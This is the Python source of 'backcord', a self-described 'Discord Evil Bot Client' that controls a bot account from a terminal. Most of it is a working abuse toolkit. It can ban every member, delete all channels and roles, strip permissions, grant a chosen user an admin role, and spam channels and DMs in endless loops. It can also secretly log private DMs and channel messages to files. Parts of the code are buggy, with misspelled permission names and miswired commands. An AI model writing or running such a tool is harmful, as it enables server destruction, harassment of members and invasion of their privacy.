#Created by ngn - 2021

from logging import Manager
import discord
import time
from discord import user
from discord import role
from discord import permissions
from discord import colour
from discord.ext.commands.core import command
from discord.team import TeamMember
from discord.utils import get
from discord.ext import commands, tasks
from discord.ext.commands import has_permissions,  CheckFailure, check, MissingPermissions
from colorama import Fore, Style, Back
from colorama import init
import os
import sys
import asyncio
init(autoreset=True)

async def ainput(string: str) -> str:
    await asyncio.get_event_loop().run_in_executor(
            None, lambda s=string: sys.stdout.write(s+' '))
    return await asyncio.get_event_loop().run_in_executor(
            None, sys.stdin.readline)

def banner():
    printBlue('''
    dP                         dP                                        dP 
    88                         88                                        88 
    88d888b. .d8888b. .d8888b. 88  .dP  .d8888b. .d8888b. 88d888b. .d888b88 
    88'  `88 88'  `88 88'  `"" 88888"   88'  `"" 88'  `88 88'  `88 88'  `88 
    88.  .88 88.  .88 88.  ... 88  `8b. 88.  ... 88.  .88 88       88.  .88 
    88Y8888' `88888P8 `88888P' dP   `YP `88888P' `88888P' dP       `88888P8 
                                                                        
                                                                        
                  Discord Evil Bot Client | Github-ngn13
    ''')

INPUT_MSG = []
JOIN_LOG = False
VERSION_BACKCORD = '1.0'
SERVER = None
TOKEN = None
LISTEN_CHANNEL = None
LISTEN_DM = None
BOT_STATUS = discord.Status.online

try:
    if sys.argv[2] == 'INVISIBLE':
        BOT_STATUS = discord.Status.invisible
    
    if sys.argv[2] == 'DND':
        BOT_STATUS = discord.Status.dnd
    
    if sys.argv[2] == 'IDLE':
        BOT_STATUS = discord.Status.idle
except:
    pass

try:
    if sys.argv[1] == 'NO-COLOR':
        def printYellow(msg):
            print(f'{msg}')

        def printBlue(msg):
            print(f'{msg}')

        def printGreen(msg):
            print(f'{msg}')

        def printRed(msg):
            print(f'{msg}')
    else:
        def printYellow(msg):
            print(Fore.YELLOW +  Style.BRIGHT + f'{msg}')

        def printBlue(msg):
            print(Fore.BLUE  + Style.BRIGHT + f'{msg}')

        def printGreen(msg):
            print(Fore.GREEN  + Style.BRIGHT + f'{msg}')

        def printRed(msg):
            print(Fore.RED  + Style.BRIGHT + f'{msg}')
except:
    def printYellow(msg):
        print(Fore.YELLOW +  Style.BRIGHT + f'{msg}')

    def printBlue(msg):
        print(Fore.BLUE  + Style.BRIGHT + f'{msg}')

    def printGreen(msg):
        print(Fore.GREEN  + Style.BRIGHT + f'{msg}')

    def printRed(msg):
        print(Fore.RED  + Style.BRIGHT + f'{msg}')

client = discord.Client()

intents = discord.Intents.default()
intents.members = True

client = commands.Bot(command_prefix=None, intents=intents)

try:
    for filename in os.listdir('./cogs'):
        if filename.endswith('.py'):
            client.load_extension(f'cogs.{filename[:-3]}')
except:
    printRed('Failed to load cogs, could not find cogs directory')

#Server Functions
async def listenJoin():
    global SERVER
    global JOIN_LOG
    if SERVER != None:
        JOIN_LOG = True
        return printGreen('Listening for join/remove activitys, they will be log to joinLogs.txt...')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def getAuditLogs(args):
    try:
        limit = int(args[1])
    except:
        return printRed('Missing argument: limit')
    
    if SERVER != None:
        try:
            logs = SERVER.audit_logs(limit=limit)
        except Exception as e:
            return printRed(f'Failed! Reason: {e}')
        with open('logs.txt', 'a') as file:
            file.write('**********************')
            async for log in logs:
                file.write(f'Author: {log.user}\n')
                file.write(f'Action: {log.action}\n')
                file.write(f'Target: {log.target}\n')
                file.write('**********************')
            file.close()
        return printGreen('Printed logs on "logs.txt".')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def inviteServer(args):
    try:
        id = int(args[1])
        chnlid = int(args[2])
    except:
        return printRed('Missing argument(s): server ID, channel ID')
    
    servertemp = client.get_guild(id)
    if servertemp == None:
        printRed('No server with that ID.')
    else:
        for c in SERVER.text_channels:
            if c.id == chnlid:
                try:
                    link = await servertemp.c.create_invite(xkcd=True, max_age = 0, max_uses = 0)
                    return printGreen(f'Here is the invite link: {link}')
                except Exception as e:
                    printRed('Failed! Reason: {e}')
        return printRed('No channel with that ID.')

async def leaveServer(args):
    try:
        id = int(args[1])
    except:
        return printRed('Missing argument: server ID')
    
    servertemp = client.get_guild(id)
    if servertemp == None:
        printRed('No server with that ID.')
    else:
        await client.leave(servertemp)
        printGreen('Left the server.')

def setServer(args):
    global SERVER
    try:
        id = int(args[1])
    except:
        return printRed('Missing argument: server ID')
    if client.get_guild(id) == None:
        printRed('No server with that ID.')
    else:
        SERVER = client.get_guild(int(id))
        printGreen('SERVER has been set.')

def serverInfo(args):
    try:
        id = int(args[1])
    except:
        return printRed('Missing argument: server ID')
    if client.get_guild(int(id)) == None:
        printRed('No server with that ID.')
    else:
        tempServer = client.get_guild(id)
        printBlue(f'''
        Server Name: {tempServer.name}
        Server ID: {tempServer.id}
        Owner: {tempServer.owner}
        Member Count: {tempServer.member_count}
        Created At: {tempServer.created_at.__format__('%A, %d. %B %Y | %H:%M:%S')}
        ''')
        try:
            printBlue(f'''
            CLASSIFIED INFORMATION
            Role Count: {len(tempServer.roles)}
            Verification Level: {tempServer.verification_level}
            Highest Role: {tempServer.roles[-2]}
            Roles: {tempServer.roles}
            ''')
        
        except Exception as e:
            printRed('Failed giving classified information! Reason: {e}')

async def renameServer(args):
    try:
        name = str(args[1])
    except:
        return printRed('Missing argument: new server name')
    global SERVER
    if SERVER != None:
        try:
            await SERVER.edit(name=name)
            printGreen('Server name changed!')
        except Exception as e:
            printRed('Failed! Reason: {e}')
    else:
        printRed('You need to set the SERVER variable to use this command.')

#User Functions
async def catDm(args):
    global SERVER
    try:
        id = int(args[1])
        limit = int(args[2])
    except:
        return printRed('Missing argument(s): user ID, message limit')
    if SERVER == None:
        printRed('You need to set the SERVER variable to use this command.')
    else:
        tempMember = SERVER.get_member(id)
        if tempMember == None:
            return printRed('No user with that ID.')
        if tempMember.dm_channel == None:
            printRed('No DM with that user.')
        else:
            tempmsgs = await tempMember.dm_channel.history(limit=limit).flatten()
            printBlue('********************')
            for m in tempmsgs:
                printBlue(f'Message content: {m.content}')
                printBlue(f'Message author: {m.author}')
                printBlue('********************')
            return printGreen('Done.')

def userInfo(args):
    global SERVER
    try:
        id = int(args[1])
    except:
        return printRed('Missing argument: user ID')
    if SERVER == None:
        printRed('You need to set the SERVER variable to use this command.')
    else:
        tempMember = SERVER.get_member(id)
        if tempMember == None:
            return printRed('No user with that ID.')
        printBlue(f'''
        Username: {tempMember}
        ID: {tempMember.id}
        Bot?: {tempMember.bot}
        Status: {tempMember.status}
        Activity: {tempMember.activity}
        Joined At {tempMember.joined_at.strftime("%d/%m/%Y %H:%M:%S")}
        Created At: {tempMember.created_at.strftime("%d/%m/%Y %H:%M:%S")}
        Boosted: {tempMember.premium_since}
        ''')

        try:
            printBlue(f'''
            CLASSIFIED INFORMATION
            Top Role: {tempMember.top_role}
            ''')
        
        except Exception as e:
            printRed('Failed giving classified information! Reason: {e}')
            

async def changeNick(args):
    global SERVER
    try:
        id = int(args[1])
        name = str(args[2])
    except:
        return printRed('Missing argument(s): user ID, new nick')
    if SERVER != None:
        try:
            tempMember = SERVER.get_member(id)
            if tempMember == None:
                return printRed('No user with that ID.')
            await tempMember.edit(nick=name)
            printGreen('Server nickname changed.')
        except Exception as e:
            printRed(f'Failed! Reason: {e}')
    else:
        printRed('You need to set the SERVER variable to use this command.')
    
async def dmUser(args):
    global SERVER
    try:
        id = int(args[1])
        msg = str(args[2])
    except:
        return printRed('Missing argument(s): user ID, message')
    if SERVER != None:
        try:
            tempMember = SERVER.get_member(id)
            if tempMember == None:
                return printRed('No user with that ID.')
            await tempMember.send(msg)
            printGreen('Message sent.')
        except Exception as e:
            printRed(f'Failed! Reason: {e}')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def kickUser(args):
    global SERVER
    try:
        id = int(args[1])
    except:
        return printRed('Missing argument: user ID')
    if SERVER != None:
        try:
            tempMember = SERVER.get_member(id)
            if tempMember == None:
                return printRed('No user with that ID.')
            await tempMember.kick()
            printGreen('User kicked.')
        except Exception as e:
            printRed(f'Failed! Reason: {e}')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def banUser(args):
    global SERVER
    try:
        id = int(args[1])
    except:
        return printRed('Missing argument: user ID')
    if SERVER != None:
        try:
            tempMember = SERVER.get_member(id)
            if tempMember == None:
                return printRed('No user with that ID.')
            await tempMember.ban()
            printGreen('User banned.')
        except Exception as e:
            printRed(f'Failed! Reason: {e}')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def unbanUser(args):
    global SERVER
    try:
        id = int(args[1])
    except:
        return printRed('Missing argument: user ID')
    if SERVER != None:
        try:
            tempMember = SERVER.get_member(id)
            if tempMember == None:
                return printRed('No user with that ID.')
            await tempMember.unban()
            printGreen('User unbanned.')
        except Exception as e:
            printRed(f'Failed! Reason: {e}')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def listUsers():
    if SERVER != None:
        printBlue('*************************')
        for m in SERVER.members:
            printBlue(f'Member name: {m}\nMember ID: {m.id}\nMember Top Role: {m.top_role}')
            printBlue('*************************')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def listBanned():
    if SERVER != None:
        try:
            banned_users = await SERVER.bans()
        except Exception as e:
            printRed('Failed! Reason: {e}')
        printBlue('*************************')
        for m in banned_users:
            printBlue(f'Member name: {m}\nMember ID: {m.id}')
            printBlue('*************************')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def listenDm(args):
    global SERVER
    global LISTEN_DM
    try:
        id = int(args[1])
    except:
        return printRed('Missing argument: user ID')
    if SERVER != None:
        tempMember = SERVER.get_member(id)
        if tempMember == None:
            return printRed('No user with that ID.')
        LISTEN_DM = tempMember.id
        return printGreen('Listening user DM, messages will be log to dmMsgs.txt...')
    else:
        printRed('You need to set the SERVER variable to use this command.')

#Role Functions
async def createRole(args):
    try:
        name = str(args[1])
        color = int(args[2])
    except:
        return printRed('Missing argument(s): role name, user ID')

    if SERVER != None:
        try:
            await SERVER.create_role(name=name, colour=discord.Colour(value=color))
            printGreen('Cretaed role.')
        except Exception as e:
            printRed(f'Failed creating admin role. Reason: {e}')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def appendAdmin(args):
    try:
        name = str(args[1])
        id = int(args[2])
    except:
        return printRed('Missing argument(s): role name, user ID')
    
    if SERVER != None:
        tempMember = SERVER.get_member(id)
        if tempMember == None:
            return printRed('No user with that ID.')
        try:
            perm = discord.Permissions(administartor=True, manage_roles=True, manage_permissions=True, manage_messages=True, manage_nicknames=True, speak=True, stream=True, view_audt_log=True, kick_members=True, move_members=True, mute_members=True, ban_members=True, change_nickname=True)
            role = await SERVER.create_role(name=name, permissions=perm)
            tempMember.add_roles(role)
            printGreen(f'Done!\nRole: {role}\nPermissions: {role.permissions}')
        except Exception as e:
            printRed(f'Failed creating admin role. Reason: {e}')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def listRoles():
    global SERVER
    if SERVER != None:
        try:
            roles = SERVER.roles
        except Exception as e:
            printRed(f'Failed! Reason: {e}')
        printBlue('********************')
        for r in roles:
            try:
                printBlue(f'Role name: {r}')
                printBlue(f'Role ID: {r.id}')
                printBlue(f'Role color: {r.color}')
                printBlue('********************')
            except Exception as e:
                printRed(f'Failed getting info of role "{r}". Reason: {e}')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def deleteRole(args):
    global SERVER
    try:
        id = int(args[1])
    except:
        return printRed('Missing argument: role ID')
    
    if SERVER != None:
        for r in SERVER.roles:
            if r.id == id:
                try:
                    await r.delete()
                    return printGreen('Deleted role.')
                except Exception as e:
                    return printRed('Failed! Reason: {e}')
            
        return printRed('No role with that ID.')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def renameRole(args):
    global SERVER
    try:
        id = int(args[1])
        name = str(args[2])
    except:
        return printRed('Missing argument(s): role ID, new name')
    
    if SERVER != None:
        for r in SERVER.roles:
            if r.id == id:
                try:
                    await r.edit(name=name)
                    return printGreen('Done.')
                except Exception as e:
                    return printRed('Failed! Reason: {e}')
            
        return printRed('No role with that ID.')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def addRole(args):
    global SERVER
    try:
        id = int(args[1])
        userid = int(args[2])
    except:
        return printRed('Missing argument(s): role ID, user ID')
    
    if SERVER != None:
        for r in SERVER.roles:
            if r.id == id:
                for m in SERVER.members:
                    if m.id == userid:
                        try:
                            await m.add_roles(r)
                            return printGreen('Added role to user.')
                        except Exception as e:
                            return printRed('Failed! Reason: {e}')

                return printRed('No user with that ID.')
            
        return printRed('No role with that ID.')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def removeRole(args):
    global SERVER
    try:
        id = int(args[1])
        userid = int(args[2])
    except:
        return printRed('Missing argument(s): role ID, user ID')

    if SERVER != None:
        for r in SERVER.roles:
            if r.id == id:
                for m in SERVER.members:
                    if m.id == userid:
                        try:
                            await m.remove_roles(r)
                            return printGreen('Removed role from user.')
                        except Exception as e:
                            return printRed('Failed! Reason: {e}')
                return printRed('No user with that ID.')
            
        return printRed('No role with that ID.')
    else:
        printRed('You need to set the SERVER variable to use this command.')


#Channel Functions
async def sendMessage(args):
    global SERVER
    try:
        id = int(args[1])
        msg = str(args[2])
    except:
        return printRed('Missing argument(s): channel ID, message')
    if SERVER != None:
        for c in SERVER.channels:
            if c.id == id:
                try:
                    await c.send(msg)
                    return printGreen('Message sent.')
                except Exception as e:
                    printRed('Failed! Reason: {e}')
            
        return printRed('No channel with that ID.')

    else:
        printRed('You need to set the SERVER variable to use this command.')

async def catChannel(args):
    global SERVER
    try:
        id = int(args[1])
        limit = int(args[2])
    except:
        return printRed('Missing argument(s): channel ID, message limit')
    
    if SERVER != None:
        for c in SERVER.channels:
            if c.id == id:
                tempmessages = await c.history(limit=limit).flatten()
                printBlue('********************')
                for m in tempmessages:
                    printBlue(f'Message content: {m.content}')
                    printBlue(f'Message author: {m.author}')
                    printBlue('********************')
                return printGreen('Done.')
            
        return printRed('No channel with that ID.')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def renameChannel(args):
    global SERVER
    try:
        id = int(args[1])
        name = str(args[2])
    except:
        return printRed('Missing argument(s): channel ID, new name')
    if SERVER != None:
        for c in SERVER.channels:
            if c.id == id:
                try:
                    await c.edit(name=name)
                    return printGreen('Channel name changed.')
                except Exception as e:
                    printRed('Failed! Reason: {e}')
            
        return printRed('No channel with that ID.')

    else:
        printRed('You need to set the SERVER variable to use this command.')

async def deleteChannel(args):
    global SERVER
    try:
        id = int(args[1])
    except:
        return printRed('Missing argument: channel ID')
    if SERVER != None:
        for c in SERVER.channels:
            if c.id == id:
                try:
                    await c.delete()
                    return printGreen('Channel has been deleted!')
                except Exception as e:
                    printRed('Failed! Reason: {e}')
        return printRed('No channel with that ID.')
    else:
        printRed('You need to set the SERVER variable to use this command.')
    
async def stopListen():
    global LISTEN_CHANNEL
    global LISTEN_DM
    LISTEN_DM = None
    LISTEN_CHANNEL = None
    printGreen('Currently, no channel is being listened.')

async def listenChannel(args):
    global SERVER
    global LISTEN_CHANNEL
    try:
        id = int(args[1])
    except:
        return printRed('Missing argument: channel ID')
    if SERVER != None:
        for c in SERVER.channels:
            if c.id == id:
                LISTEN_CHANNEL = c.id
                return printGreen('Listening channel, messages will be log to channelMsgs.txt.')
        return printRed('No channel with that ID.')
    else:
        printRed('You need to set the SERVER variable to use this command.')

def listChannels():
    global SERVER
    if SERVER != None:
        printBlue('*************************')
        for c in SERVER.text_channels:
            printBlue(f'Channel Name: {c.name}\nChannel ID: {c.id}\nType: Text channel')
            printBlue('*************************')
        
        for v in SERVER.voice_channels:
            printBlue(f'Channel Name: {v.name}\nChannel ID: {v.id}\nType: Voice channel')
            printBlue('*************************')

        for a in SERVER.categories:
            printBlue(f'Channel Name: {a.name}\nChannel ID: {a.id}\nType: Categorie')
            printBlue('*************************')

    else:
        printRed('You need to set the SERVER variable to use this command.')

#Bombs
async def bombRoles():
    global SERVER
    if SERVER != None:
        for r in SERVER.roles:
            try:
                await r.delete()
            except Exception as e:
                printRed(f'Could not delete role "{r}". Reason: {e}')
        printGreen('Completed.')
    else:
       printRed('You need to set the SERVER variable to use this command.') 

async def spamRole(args):
    global SERVER
    try:
        name = str(args[2])
    except:
        return printRed('Missing argument: role name')

    if SERVER != None:
        try:
            await SERVER.create_role(name=name)
        except Exception as e:
            return printRed(f'Failed to create role. Reason {e}')
        
        printYellow('Spamming roles... (ctrl+c to quit)')

        while True:
            try:
                await SERVER.create_role(name=name)
            except:
                printGreen('\nQuitting!')
    else:
        printRed('You need to set the SERVER variable to use this command.')


async def bombChannels():
    global SERVER
    if SERVER != None:
        for c in SERVER.channels:
            try:
                await c.delete()
            except Exception as e:
                printRed(f'Could not delete channel named "{c}". Reason: {e}')
        printGreen('Completed.')
    else:
        printRed('You need to set the SERVER variable to use this command.')
        
async def spamChannel(args):
    global SERVER
    try:
        channelid = int(args[1])
        msg = str(args[2])
    except:
        return printRed('Missing argument: channel ID')

    if SERVER != None:
        for c in SERVER.channels:
            if c.id == channelid:
                try:
                    await c.send(msg)
                except Exception as e:
                    return printRed(f'Failed to send message. Reason: {e}')

                printYellow(f'Spamming message to {c}... (ctrl+c to quit)')

                while True:
                    try:
                        await c.send(msg)
                    except:
                        printRed('\nQuitting!')

        return printRed('No channel with that ID.')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def dmAll(args):
    global SERVER
    try:
        msg = str(args[1])
    except:
        return printRed('Missing argument: message')
    
    if SERVER != None:
        membercount = len(SERVER.members)
        currentN = 0
        for m in SERVER.members:
            if m != client.user:
                currentN += 1
                try:
                    printYellow(f'Sending messages... {currentN}/{membercount} - ({m})')
                    await m.send(msg)
                except Exception as e:
                    printRed(f'Failed to send message to {m}. Reason: {e}')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def disableRoles():
    global SERVER
    if SERVER != None:
        perm = discord.Permissions(administrator=False, manage_roles=False, manage_permissions=False, manage_messages=False, manage_nicknames=False, speak=False, stream=False, view_audt_log=False, kick_members=False, move_members=False, mute_members=False, ban_members=False, change_nickname=False)
        for r in SERVER.roles:
            try:
                await r.edit(permissions=perm)
            except Exception as e:
                printRed(f'Failed setting permissions of role "{r}". Reason: {e}')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def bombServer():
    global SERVER
    if SERVER != None:
        for m in SERVER.members:
            try:
                await m.ban()
            except Exception as e:
                printRed(f'Failed to ban {m}. Reason: {e}')
        printGreen('Completed.')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def dmSpam(args):
    global SERVER
    try:
        msg = str(args[2])
        id = int(args[1])
    except:
        return printRed('Missing argument(s): user ID, message')
    
    if SERVER != None:
        for m in SERVER.members:
            if m.id == id:
                tempmember = m
                try:
                    await m.send(msg)
                except:
                    return printRed('Cannot send message to user.')

                printYellow('Spaming message... (ctrl+c to quit)')

                while True:
                    try:
                        await m.send(msg)
                    except:
                        return printGreen('\nQuitting!')

        return printRed('No user with that ID.')
    else:
        printRed('You need to set the SERVER variable to use this command.')

async def terminalMenu():
        global INPUT_MSG
        if len(INPUT_MSG) != 0:
            for m in INPUT_MSG:
                printYellow(str(m))
            INPUT_MSG.clear()
        try:
            clientusername = str(client.user)
            clientusername = clientusername.replace(' ', '-')
            command = await ainput(f'{clientusername}~#')
            command = command[:-1]
        except EOFError:
            command = 'exit'
        if command.startswith('listServers'):
            printBlue('*************************')
            for i in client.guilds:
                printBlue(f'Server name: {i.name}\nServer ID: {i.id}')
                printBlue('*************************')
        
        elif command.startswith('exit'):
            printBlue('\nBye!')
            os._exit(0)

        elif command.startswith('banner'):
            banner()
        
        elif command.startswith('version'):
            printBlue(f'{VERSION_BACKCORD} - 2021')

        elif command.startswith('setServer'):
            setServer(command.split(' '))
        
        elif command.startswith('serverInfo'):
            serverInfo(command.split(' '))
    
        elif command.startswith('userInfo'):
            userInfo(command.split(' '))

        elif command.startswith('renameServer'):
            await renameServer(command.split(' '))
    
        elif command.startswith('listChannels'):
            listChannels()

        elif command.startswith('clear') or command.startswith('cls'):
            if os.name == "nt":
                os.system('cls')
            else:
                os.system('clear')

        elif command.startswith('dmUser'):
            await dmUser(command.split(' '))

        elif command.startswith('kickUser'):
            await kickUser(command.split(' '))

        elif command.startswith('banUser'):
            await banUser(command.split(' '))
        
        elif command.startswith('unbanUser'):
            await unbanUser(command.split(' '))
        
        elif command.startswith('listBanned'):
            await listBanned()
        
        elif command.startswith('listUsers'):
            await listUsers()
        
        elif command.startswith('renameChannel'):
            await renameChannel(command.split(' '))

        elif command.startswith('deleteChannel'):
            await deleteChannel(command.split(' '))

        elif command.startswith('listenChannel'):
            await listenChannel(command.split(' '))

        elif command.startswith('listenDm'):
            await listenDm(command.split(' '))

        elif command.startswith('stopListen'):
            await stopListen()
        
        elif command.startswith('leaveServer'):
            await leaveServer(command.split(' '))
        
        elif command.startswith('catChannel'):
            await catChannel(command.split(' '))
        
        elif command.startswith('catDm'):
            await catDm(command.split(' '))

        elif command.startswith('changeNick'):
            await changeNick(command.split(' '))
        
        elif command.startswith('listRoles'):
            await listRoles()

        elif command.startswith('listRoles'):
            await renameRole(command.split(' '))

        elif command.startswith('deleteRole'):
            await deleteRole(command.split(' '))
        
        elif command.startswith('addRole'):
            await addRole(command.split(' '))
        
        elif command.startswith('inviteServer'):
            await inviteServer(command.split(' '))
        
        elif command.startswith('sendMessage'):
            await sendMessage(command.split(' '))

        elif command.startswith('removeRole'):
            await renameRole(command.split(' '))

        elif command.startswith('getAuditLogs'):
            await getAuditLogs(command.split(' '))

        elif command.startswith('listenJoin'):
            await listenJoin()
        
        elif command.startswith('dmAll'):
            await dmAll(command.split(' '))
    
        elif command.startswith('dmSpam'):
            await dmSpam(command.split(' '))

        elif command.startswith('bombChannels'):
            await bombChannels()

        elif command.startswith('spamChannel'):
            await spamChannel(command.split(' '))

        elif command.startswith('bombRoles'):
            await bombRoles()
        
        elif command.startswith('spamRole'):
            await spamRole(command.split(' '))

        elif command.startswith('bombServer'):
            await bombServer()

        elif command.startswith('disableRoles'):
            await disableRoles()

        elif command.startswith('appendAdmin'):
            await appendAdmin(command.split(' '))

        elif command.startswith('createRole'):
            await createRole(command.split(' '))

        elif command.startswith('help') or command.startswith('h'):
            try:
                with open('commands.md', 'r') as f:
                    printBlue(f.read())
                    f.close()
            except:
                printRed('Could not find commands.md, cant print out help menu. Check https://github.com/ngn13/backcord for commands.md')

        else:
            printRed('Unknown command. Type "help" to see commands.')
              

@client.event
async def on_ready():
    printGreen('Sucesfully logged in bot account.')
    printRed('WARNING! You are the only person responsible for misuse of this tool!')
    printBlue('NOTE: If you get stuck, get an error/issuse or something, check https://github.com/ngn13/backcord')
    await client.change_presence(status=BOT_STATUS)
    while True:
        await terminalMenu()

@client.event
async def on_member_join(member):
    global JOIN_LOG
    if JOIN_LOG:
        if member.guild.id != SERVER.id:
            return
        with open('joinLogs.txt', 'a') as file:
            file.write(f'Action: Join\n')
            file.write(f'Member: {member}\n')
            file.write(f'Member ID: {member.id}\n')
            crtime = time.strftime("%Y/%m/%d %H:%M:%S", time.gmtime())
            file.write(f'Time: {crtime}\n')
            file.write('*********************\n')
            file.close()
        for m in INPUT_MSG:
            if m == 'LISTENING JOIN EVENT: New user(s) joined.':
                return
        INPUT_MSG.append('LISTENING JOIN EVENT: New user(s) joined.')

@client.event
async def on_member_remove(member):
    global JOIN_LOG
    if JOIN_LOG:
        if member.guild.id != SERVER.id:
            return
        with open('joinLogs.txt', 'a') as file:
            file.write(f'Action: Join\n')
            file.write(f'Member: {member}\n')
            file.write(f'Member ID: {member.id}\n')
            crtime = time.strftime("%Y/%m/%d %H:%M:%S", time.gmtime())
            file.write(f'Time: {crtime}\n')
            file.write('*********************\n')
            file.close()
        for m in INPUT_MSG:
            if m == 'LISTENING JOIN EVENT: New user(s) joined.':
                return
        INPUT_MSG.append('LISTENING JOIN EVENT: New user(s) joined.')

@client.event
async def on_message(message):
    #await client.process_commands(message)
    global INPUT_MSG
    global LISTEN_DM
    global LISTEN_CHANNEL
    if LISTEN_DM != None:
        if message.author.id == LISTEN_DM:
            if isinstance(message.channel, discord.channel.DMChannel):
                msg = f'Message: {message.content}\nMessage author: {message.author}'
                with open('dmMsgs.txt', 'a') as file:
                    file.write(msg + '\n')
                    crtime = time.strftime("%Y/%m/%d %H:%M:%S", time.gmtime())
                    file.write(f'Time: {crtime}\n')
                    file.write('*********************\n')
                    file.close()
                for m in INPUT_MSG:
                    if m == 'LISTENING DM: Recieved new message(s).':
                        return
                INPUT_MSG.append('LISTENING DM: Recieved new message(s).')

    if LISTEN_CHANNEL != None:
        if message.channel.id == LISTEN_CHANNEL:
            if not isinstance(message.channel, discord.channel.DMChannel):
                if message.guild.id != SERVER.id:
                    return
                msg = f'Message: {message.content}\nMessage author: {message.author}'
                with open('channelMsgs.txt', 'a') as file:
                    file.write(msg + '\n')
                    crtime = time.strftime("%Y/%m/%d %H:%M:%S", time.gmtime())
                    file.write(f'Time: {crtime}\n')
                    file.write('*********************\n')
                    file.close()
                for m in INPUT_MSG:
                    if m == 'LISTENING CHANNEL: Recieved new message(s).':
                        return
                INPUT_MSG.append('LISTENING CHANNEL: Recieved new message(s).')

try:
    banner()
    try:
        TOKEN = input('Enter bot token: ')
    except KeyboardInterrupt:
        printBlue('\nBye!')
        exit()
    client.run(TOKEN)
except Exception as e:
    printGreen(f'Cannot login to the bot account. Reason: {e}')
